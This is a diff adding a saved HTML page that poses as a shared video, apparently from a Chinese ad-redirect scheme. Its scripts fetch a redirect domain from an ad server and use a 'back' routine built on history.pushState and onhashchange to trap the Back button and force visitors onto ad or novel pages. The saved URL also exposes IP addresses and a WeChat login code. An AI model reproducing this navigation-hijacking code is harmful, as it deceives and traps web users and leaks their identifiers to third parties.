@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<!-- saved from url=(0454)http://gmeauxbeaq.dfrjrbl.cn:443/video_kuaishou/?user_id=800025&video_id=65861&ad_id=0&share_type=1&generate_time=1597300842&e=eyJ0eXBlIjoyLCJzaWduIjoiODBNNzRNIiwicGxhdGZvcm0iOjF9&appid=wx6c4753f4cb0e7693&shareIp=114.97.115.197&share_channel_code=2003&rec_requestid=&code=051WJi000Zwo6K10C6200sMag03WJi07&state=&requestIp=117.65.109.54&showAd=1&time=1597305221&mm=IrxqlarooI&twiceCallback=http%3A%2F%2Fgo-my.cn&appidtwice=wx6c4753f4cb0e7693#1597305230970 -->
+<html lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>辣妹不起来 无语</title>
+	<link rel="icon" href="data:;base64,=">
+	<link rel="stylesheet" href="./index/iframe.css">
+	<script src="./index/hm.js"></script>
+	<script>
+        var BASE = {
+            "api": "http:\/\/kz-api.gaungdiyeya.com:10002",
+            "ws_api": "ws:\/\/kuaizhuandsp.cn:20003",
+            "APP_ID": 102182,
+            "user_api": "http:\/\/kuaizhuandsp.cn:10080",
+            "app_key": "jqxs7e",
+            "name": "kuaizhuan",
+            "CN_name": "\u5feb\u8f6c",
+            "re_uid": "http:\/\/kuaizhuandsp.cn:443\/iframe\/",
+            "baiduJs": "https:\/\/hm.baidu.com\/hm.js?0fb076b975e9adfb0e7cc57f207e3da7"
+        }
+	</script>
+	<script src="./index/video_list.js"></script>
+	<script src="./index/default.js"></script>
+	<script src="./index/eruda.min.js"></script>
+	<style type="text/css">
+		.eruda-search-highlight-block {
+			display: inline;
+		}
+
+		.eruda-search-highlight-block .eruda-keyword {
+			background: #ffc107;
+			color: #fff;
+		}
+	</style>
+</head>
+<body style="zoom: 1;">
+<img src="http://gmeauxbeaq.dfrjrbl.cn:443/video_kuaishou/?user_id=800025&amp;video_id=65861&amp;ad_id=0&amp;share_type=1&amp;generate_time=1597300842&amp;e=eyJ0eXBlIjoyLCJzaWduIjoiODBNNzRNIiwicGxhdGZvcm0iOjF9&amp;appid=wx6c4753f4cb0e7693&amp;shareIp=114.97.115.197&amp;share_channel_code=2003&amp;rec_requestid=&amp;code=051WJi000Zwo6K10C6200sMag03WJi07&amp;state=&amp;requestIp=117.65.109.54&amp;showAd=1&amp;time=1597305221&amp;mm=IrxqlarooI&amp;twiceCallback=http%3A%2F%2Fgo-my.cn&amp;appidtwice=wx6c4753f4cb0e7693"
+	 alt="" class="erweimaclass">
+<iframe src="./index/iframe.html" frameborder="0" class="tongji" style="height: 617px; display: inline;"></iframe>
+
+<script src="./index/jquery-1.9.0.min.js"></script>
+<script src="./index/base64.js"></script>
+<script>
+    // 加载iframe
+    var params = window.location.search;
+    var clientHeight = window.screen.height;
+    $('.tongji').css({'height': clientHeight - 50});
+    $('.tongji').attr('src', './index/iframe.html' + params);
+</script>
+<script>
+    // 处理iframe title
+    function getChildValue(params) {
+        $('title').html(params)
+    }
+
+    // 处理iframe 显示
+    function iframeShow(params) {
+        if (params == 1) {
+            $('.tongji').show();
+        } else {
+            $('.tongji').hide();
+        }
+    }
+
+    // 解决iframe内二维码ios无法识别
+    window.addEventListener('message', function (e) {
+        if (e.data == 'ret') {
+            return
+        }
+        var data = JSON.parse(e.data)
+        if (data.status == 1) {
+            $('.erweimaclass').css('z-index', 3)
+            $('.erweimaclass').attr('src', data.url).show();
+        } else if (data.status == 2) {
+            $('.erweimaclass').css('z-index', '1')
+            $('.erweimaclass').hide();
+        } else if (data.status == 3) {
+            $('.erweimaclass').css('z-index', '1')
+            $('.erweimaclass').hide();
+        }
+    })
+
+
+</script>
+<script>
+    var _BASE_URL_ = BASE.api;
+    var retUrl = DEFAULTETURL;
+    var retParams = null;
+    var nowTime = new Date().getTime();
+    var stringCode = BASE64.encode((nowTime / 1000).toFixed(0));
+    var delUrl = funcUrlDel('video_id');
+    var goUrl = '';
+    var codeObj = {
+        "X-CCMS": stringCode
+    }
+
+    function getParam(variable) {
+        var query = window.location.search.substring(1);
+        var vars = query.split('&');
+        for (var i = 0; i < vars.length; i++) {
+            var pair = vars[i].split('=');
+            if (pair[0] == variable) {
+                return pair[1];
+            }
+        }
+        return false;
+    }
+
+    var video_id = getParam('video_id');
+    var user_id = getParam('user_id');
+    var chileWin = $('.tongji')[0].contentWindow;
+
+    // 获取一返域名
+    getRetUrl();
+
+    function getRetUrl() {
+        $.ajax({
+            url: 'http://ad.mizhuanba.com/bak/gg/api/api_gg.php?cp3bfan1=1',
+            dataType: 'jsonp',
+            jsonp: 'callback',
+            jsonpCallback: 'callback',
+            success: function (res) {
+                retUrl = res.domainname;
+                goUrl = retUrl + '?fristId=' + video_id + '&user_id=' + user_id + '&backUrl=' + encodeURIComponent(delUrl) + '&api=' + encodeURIComponent(BASE.api) + '&APP_ID=' + BASE.APP_ID + '&platform=' + BASE.name + '&user_api=' + encodeURIComponent(BASE.user_api);
+                $('.tongji').on('load', function () {
+                    back(goUrl, function () {
+                        chileWin.sendRet();
+                    })
+                })
+            },
+            error: function (res) {
+                console.log('ad_ret_list errer');
+                location.href = 'http://baidu.com';
+            }
+        })
+    }
+
+    /**
+     * 获取返回小说接口
+     */
+// getNovelDoamin()
+    function getNovelDoamin() {
+        var retParam = '';
+        if (BASE.name == 'kuaizhuan') {
+            retParam = 'kzfh1';
+        } else {
+            retParam = 'sanbufan1';
+        }
+        $.ajax({
+            url: 'http://api.longxx.cn/bak/gg/api/api_gg.php?' + retParam,
+            dataType: 'jsonp',
+            jsonp: 'callback',
+            jsonpCallback: 'callback',
+            success: function (res) {
+                // console.log(res);
+                $('.tongji').on('load', function () {
+                    back(res.domainname, function () {
+                        chileWin.sendRet();
+                    })
+                })
+            },
+            error: function (res) {
+                console.log('ad_ret_list errer');
+                location.href = 'http://baidu.com';
+            }
+        })
+    }
+
+    // 删除地址栏中某个参数
+    function funcUrlDel(name) {
+        var loca = window.location;
+        var baseUrl = loca.origin + loca.pathname + "?";
+        var query = loca.search.substr(1);
+        if (query.indexOf(name) > -1) {
+            var obj = {}
+            var arr = query.split("&");
+            for (var i = 0; i < arr.length; i++) {
+                arr[i] = arr[i].split("=");
+                obj[arr[i][0]] = arr[i][1];
+            }
+            ;
+            delete obj[name];
+            var url = baseUrl + JSON.stringify(obj).replace(/[\"\{\}]/g, "").replace(/\:/g, "=").replace(/\,/g, "&");
+            return url
+        }
+        ;
+    }
+
+    // 退弹
+    function back(url, callback) {
+        history.pushState(history.length + 1, "message", window.location.href.split('#')[0] + "#" + new Date().getTime());
+        if (navigator.userAgent.indexOf('Android') != -1) {
+            if (typeof (tbsJs) != "undefined") {
+                tbsJs.onReady('{useCachedApi : "true"}', function (e) {
+                })
+                window.onhashchange = function () {
+                    callback && callback();
+                    setTimeout(function () {
+                        top.location.href = url;
+                    }, 10)
+                };
+            } else {
+                var pop = 0;
+                window.onhashchange = function (event) {
+                    pop++
+                    if (pop >= 3) {
+                        callback && callback();
+                        setTimeout(function () {
+                            top.location.href = url;
+                        }, 10)
+                    } else {
+                        history.forward();
+                    }
+                };
+                history.back(-1)
+            }
+        } else {
+            window.onhashchange = function () {
+                callback && callback();
+                setTimeout(function () {
+                    top.location.href = url;
+                }, 10)
+            };
+        }
+    }
+
+</script>
+</body>
+</html>
